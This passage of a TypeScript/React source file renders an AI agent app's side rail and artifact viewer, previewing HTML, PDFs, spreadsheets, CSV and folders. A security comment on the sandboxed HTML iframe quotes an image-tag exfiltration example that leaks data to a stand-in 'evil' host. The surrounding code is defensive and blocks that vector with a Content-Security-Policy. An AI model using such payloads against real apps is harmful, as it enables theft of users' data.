            {toolNames.length ? t("rail.tool_calls", { count: toolNames.length }) : t("rail.working")}
          </div>
        )}
      </div>
    );
  }
  if (running) {
    return (
      <div className="rail-muted">
        {toolNames.length ? t("rail.working_task_with_tools", { count: toolNames.length }) : t("rail.working_task")}
      </div>
    );
  }
  return (
    <div className="rail-muted">
      {t("rail.empty_state")}
    </div>
  );
}

function RailSection({
  title,
  open,
  onToggle,
  children,
  action,
  count,
  countAttention,
}: {
  title: string;
  open: boolean;
  onToggle: () => void;
  children: ReactNode;
  action?: ReactNode;
  // The header's maximum signal: a small count chip; amber when it carries attention
  // states (blocked/review). Panels never shout louder than this.
  count?: string;
  countAttention?: boolean;
}) {
  return (
    <section className="rail-section">
      <div className="rail-section-head">
        <button
          className="rail-section-toggle"
          data-testid={`rail-toggle-${title.toLowerCase()}`}
          onClick={onToggle}
        >
          <Icon name={open ? "chevronDown" : "chevronRight"} size={14} className="rail-chev" />
          <span>{title}</span>
          {count && (
            <span className={"rail-count" + (countAttention ? " attention" : "")}>{count}</span>
          )}
        </button>
        {action}
      </div>
      {open && <div className="rail-section-body">{children}</div>}
    </section>
  );
}

// OPE-91: agent-authored HTML is untrusted active content rendered inside the PRIVILEGED
// app webview (Tauri IPC). The sandbox must therefore be airtight on two axes:
//  - no `allow-same-origin`: with srcDoc, that flag would run the page same-origin with
//    the app — scripts could reach the parent document and the IPC bridge.
//  - no network: a poisoned report exfiltrates at DISPLAY time via subresources
//    (<img src="https://evil/?leak=…">). The injected CSP allows inline style/script
//    (what report interactivity needs) and data: images; everything remote is blocked.
// Injected at position 0 so it takes effect before any content the page declares.
const ARTIFACT_CSP =
  '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; ' +
  "style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:;\">";

function sandboxHtml(html: string): string {
  return ARTIFACT_CSP + html;
}

function ArtifactViewer({
  sessionId,
  artifact,
  content,
  onReload,
  onBack,
  onOpenEntry,
}: {
  sessionId: string;
  artifact: ArtifactInfo;
  content: ArtifactContent | null;
  onReload: () => Promise<void>;
  onBack: () => void;
  // Folder listings: open a child entry in the viewer (files and subfolders alike).
  onOpenEntry?: (path: string) => void;
}) {
  const { t } = useTranslation();
  const [reloadKey, setReloadKey] = useState(0);
  // UX-038: the ambiguous icon cluster collapsed into ONE labeled ⋯ menu; the
  // breadcrumb parent is the back action and ✕ closes. Copy CONTENTS is the
  // primary copy — the path copy (a 2026-07-12 tester fix) lives under it, labeled.
  const [menuOpen, setMenuOpen] = useState(false);
  const menuRef = useRef<HTMLDivElement | null>(null);
  useEffect(() => {
    if (!menuOpen) return;
    const close = (e: MouseEvent) => {
      if (!menuRef.current?.contains(e.target as Node)) setMenuOpen(false);
    };
    window.addEventListener("mousedown", close);
    return () => window.removeEventListener("mousedown", close);
  }, [menuOpen]);
  const isHtml = content?.kind === "html" && !content.error;
  // Best viewed in a real app: spreadsheets, PDFs, and Office docs (pptx/docx can't preview inline)
  const isApp = content?.kind === "sheet" || content?.kind === "pdf" || content?.kind === "office";
  // Text-bearing kinds can copy their contents; images/PDFs/sheets have nothing textual to copy.
  const copyableText = typeof content?.content === "string" && !content?.error;
  const crumbRoot = artifact.origin === "files" ? t("rail.crumb_files") : t("rail.artifacts_title");
  const item = (
    testid: string,
    icon: Parameters<typeof Icon>[0]["name"],
    label: string,
    onClick: () => void,
  ) => (
    <button
      className="artifact-menu-item"
      data-testid={testid}
      onClick={() => {
        setMenuOpen(false);
        onClick();
      }}
    >
      <Icon name={icon} size={14} />
      <span>{label}</span>
    </button>
  );

  return (
    <div className="artifact-viewer">
      <div className="artifact-head">
        <div className="artifact-heading">
          <div className="artifact-title">
            <button
              className="artifact-crumb-link"
              data-testid="artifact-crumb-back"
              onClick={onBack}
              title={t("rail.back_to", { name: crumbRoot })}
            >
              {crumbRoot}
            </button>
            <span className="artifact-sep">/</span>
            <span>{artifact.name}</span>
          </div>
          <div className="artifact-path">{artifact.path}</div>
        </div>
        <div className="rail-actions">
          {isHtml && (
            <button
              className="artifact-icon-btn"
              onClick={async () => {
                await onReload();
                setReloadKey((k) => k + 1);
              }}
              aria-label={t("rail.reload_preview")}
              title={t("rail.reload")}
            >
              <Icon name="refresh" size={16} />
            </button>
          )}
          <div className="artifact-menu-wrap" ref={menuRef}>
            <button
              className="artifact-icon-btn"
              data-testid="artifact-more"
              aria-label={t("rail.more_actions")}
              title={t("rail.more")}
              onClick={() => setMenuOpen((v) => !v)}
            >
              <Icon name="moreHorizontal" size={16} />
            </button>
            {menuOpen && (
              <div className="artifact-menu" data-testid="artifact-menu">
                {copyableText &&
                  item("artifact-copy-contents", "copy", t("rail.copy_contents"), () =>
                    navigator.clipboard?.writeText(content?.content || ""),
                  )}
                {item("artifact-copy-path", "file", t("rail.copy_path"), () =>
                  navigator.clipboard?.writeText(artifact.abs_path || artifact.path),
                )}
                <div className="artifact-menu-div" />
                {isHtml &&
                  item("artifact-open-browser", "panelOpen", t("rail.open_in_browser"), () =>
                    revealArtifact(sessionId, artifact.path, "open"),
                  )}
                {isApp &&
                  item("artifact-open-app", "panelOpen", t("rail.open_in_default"), () =>
                    revealArtifact(sessionId, artifact.path, "open"),
                  )}
                {item("artifact-reveal", "folder", t("rail.reveal_in_finder"), () =>
                  revealArtifact(sessionId, artifact.path, "reveal"),
                )}
              </div>
            )}
          </div>
          <button
            className="artifact-icon-btn"
            data-testid="artifact-close"
            onClick={onBack}
            aria-label={t("rail.close_viewer")}
            title={t("rail.close")}
          >
            <Icon name="x" size={16} />
          </button>
        </div>
      </div>
      <div className="artifact-preview">
        {!content ? (
          <div className="rail-muted">{t("rail.loading")}</div>
        ) : content.error ? (
          <div className="rail-error">{content.error}</div>
        ) : content.kind === "html" ? (
          <iframe
            key={`${artifact.path}-${reloadKey}`}
            sandbox="allow-scripts"
            className="artifact-frame"
            data-testid="artifact-frame"
            srcDoc={sandboxHtml(content.content || "")}
          />
        ) : content.kind === "markdown" ? (
          <div className="artifact-md">
            <Markdown text={content.content || ""} />
          </div>
        ) : content.kind === "image" ? (
          <img className="artifact-image" src={content.data_url} />
        ) : content.kind === "video" ? (
          <video
            className="artifact-video"
            data-testid="artifact-video"
            controls
            playsInline
            preload="metadata"
            src={artifactVideoUrl(sessionId, artifact.path)}
            aria-label={t("rail.video_preview")}
          />
        ) : content.kind === "pdf" ? (
          <PdfViewer dataUrl={content.data_url || ""} />
        ) : content.kind === "csv" ? (
          <CsvTable text={content.content || ""} />
        ) : content.kind === "sheet" ? (
          <SheetViewer dataUrl={content.data_url || ""} />
        ) : content.kind === "folder" ? (
          // A linked directory (e.g. a skill package): render the listing, click through.
          <div className="artifact-folderlist" data-testid="artifact-folder">
            {(content.entries || []).map((e) => (
              <button
                key={e.name}
                className="artifact-folder-row"
                onClick={() => onOpenEntry?.(`${artifact.path.replace(/\/+$/, "")}/${e.name}`)}
              >
                <Icon name={e.dir ? "folder" : "file"} size={14} />
                <span className="artifact-folder-name">{e.name}</span>
                {!e.dir && <span className="artifact-folder-size">{formatBytes(e.size)}</span>}
              </button>
            ))}
            {!content.entries?.length && <div className="rail-muted">{t("rail.folder_empty")}</div>}
          </div>
        ) : content.kind === "office" ? (
          <div className="artifact-open-prompt">
            <Icon name="panelOpen" size={28} />
            <p>{t("rail.office_no_preview", { type: /\.pptx?$/i.test(artifact.name) ? "PowerPoint" : "Word" })}</p>
            <button className="btn sm" onClick={() => revealArtifact(sessionId, artifact.path, "open")}>
              {t("rail.open_in_default")}
            </button>
          </div>
        ) : (
          <pre className="artifact-code">{content.content}</pre>
        )}
      </div>
    </div>
  );
}

const MAX_TABLE_ROWS = 500;

function GridTable({ rows, note }: { rows: unknown[][]; note?: string }) {
  const { t } = useTranslation();
  const [head, ...body] = rows;
  return (
    <div className="artifact-tablewrap">
      <table className="artifact-table">
        {head && (
          <thead>
            <tr>{head.map((c, i) => <th key={i}>{String(c ?? "")}</th>)}</tr>
          </thead>
        )}
        <tbody>
          {body.slice(0, MAX_TABLE_ROWS).map((r, i) => (
            <tr key={i}>{r.map((c, j) => <td key={j}>{String(c ?? "")}</td>)}</tr>
          ))}
        </tbody>
      </table>
      {(note || body.length > MAX_TABLE_ROWS) && (
        <div className="rail-muted artifact-table-note">
          {note}
          {body.length > MAX_TABLE_ROWS ? ` ${t("rail.table_truncated", { max: MAX_TABLE_ROWS, total: body.length })}` : ""}
        </div>
      )}
    </div>
  );
}

// Minimal RFC-4180-ish CSV parsing: quoted fields, escaped quotes, CRLF. TSV via tab sniffing.
function parseCsv(text: string): string[][] {
  const delim = text.includes("\t") && !text.split("\n")[0]?.includes(",") ? "\t" : ",";
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quoted) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i++;
        } else quoted = false;
      } else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === delim) {
      row.push(cell);
      cell = "";
    } else if (ch === "\n" || ch === "\r") {
      if (ch === "\r" && text[i + 1] === "\n") i++;
      row.push(cell);
      cell = "";
      rows.push(row);
      row = [];
    } else cell += ch;
  }
  if (cell !== "" || row.length) {
    row.push(cell);
    rows.push(row);
  }
  return rows.filter((r) => r.some((c) => c !== ""));
}

function CsvTable({ text }: { text: string }) {
  const { t } = useTranslation();
  const rows = parseCsv(text);
  if (!rows.length) return <div className="rail-muted artifact-table-note">{t("rail.empty_file")}</div>;
  return <GridTable rows={rows} />;
}

// xlsx/xls preview via SheetJS (loaded on demand — it's a heavy module): sheet tabs + a capped
// grid. Real spreadsheet work belongs in Numbers/Excel via "Open in default app".
// WKWebView has no inline PDF plugin (<embed> shows a gray pane in the Tauri shell), so we
// rasterize pages with pdf.js onto stacked canvases — same lazy-chunk pattern as SheetViewer.
function PdfViewer({ dataUrl }: { dataUrl: string }) {
  const { t } = useTranslation();
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(true);
  const holder = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    let cancelled = false;
    setError("");
    setLoading(true);
    const base64 = dataUrl.split(",")[1] || "";
    import("pdfjs-dist")
      .then(async (pdfjs) => {
        pdfjs.GlobalWorkerOptions.workerSrc = pdfWorkerUrl;
        const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0));
        const doc = await pdfjs.getDocument({ data: bytes }).promise;
        const el = holder.current;
        if (cancelled || !el) return;
        el.innerHTML = "";
        const width = el.clientWidth || 640;
        const dpr = window.devicePixelRatio || 1;
        for (let i = 1; i <= doc.numPages; i++) {
          const page = await doc.getPage(i);
          const base = page.getViewport({ scale: 1 });
          const viewport = page.getViewport({ scale: (width / base.width) * dpr });
          const canvas = document.createElement("canvas");
          canvas.width = viewport.width;
          canvas.height = viewport.height;
          canvas.className = "artifact-pdf-page";
          await page.render({ canvasContext: canvas.getContext("2d")!, viewport }).promise;
          if (cancelled) return;
          el.appendChild(canvas);
        }
        setLoading(false);
      })
      .catch((e) => !cancelled && setError(String(e?.message || e)));
    return () => {
      cancelled = true;
    };
  }, [dataUrl]);

  if (error) return <div className="rail-error artifact-table-note">{t("rail.pdf_error", { error })}</div>;
  return (
    <div className="artifact-pdfjs">
      {loading && <div className="rail-muted artifact-table-note">{t("rail.pdf_rendering")}</div>}
      <div ref={holder} />
    </div>
  );
}

function SheetViewer({ dataUrl }: { dataUrl: string }) {
  const { t } = useTranslation();
  const [sheets, setSheets] = useState<{ name: string; rows: unknown[][] }[] | null>(null);
  const [error, setError] = useState("");
  const [active, setActive] = useState(0);

  useEffect(() => {
    let cancelled = false;
    setSheets(null);
    setError("");
    setActive(0);
    const base64 = dataUrl.split(",")[1] || "";
    import("xlsx")
      .then((XLSX) => {
        if (cancelled) return;
        const wb = XLSX.read(base64, { type: "base64" });
        setSheets(
          wb.SheetNames.map((name) => ({
            name,
            rows: XLSX.utils.sheet_to_json(wb.Sheets[name], { header: 1, defval: "" }) as unknown[][],
          })),
        );
      })
      .catch((e) => !cancelled && setError(String(e?.message || e)));
    return () => {
      cancelled = true;
    };
  }, [dataUrl]);

  if (error) return <div className="rail-error artifact-table-note">{t("rail.sheet_error", { error })}</div>;
  if (!sheets) return <div className="rail-muted artifact-table-note">{t("rail.sheet_parsing")}</div>;
  const sheet = sheets[active];
  return (
    <div className="sheet-viewer">
      {sheets.length > 1 && (
        <div className="sheet-tabs">
          {sheets.map((s, i) => (
            <button key={s.name} className={"sheet-tab" + (i === active ? " active" : "")} onClick={() => setActive(i)}>
              {s.name}
            </button>
          ))}
        </div>
      )}
      {sheet.rows.length ? <GridTable rows={sheet.rows} /> : <div className="rail-muted artifact-table-note">{t("rail.sheet_empty")}</div>}
    </div>
  );
}

function formatBytes(bytes: number): string {
  if (!Number.isFinite(bytes)) return "";
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function formatTime(epochSeconds: number): string {
  if (!epochSeconds) return "";
  return new Date(epochSeconds * 1000).toLocaleTimeString(undefined, { hour: "numeric", minute: "2-digit" });
}
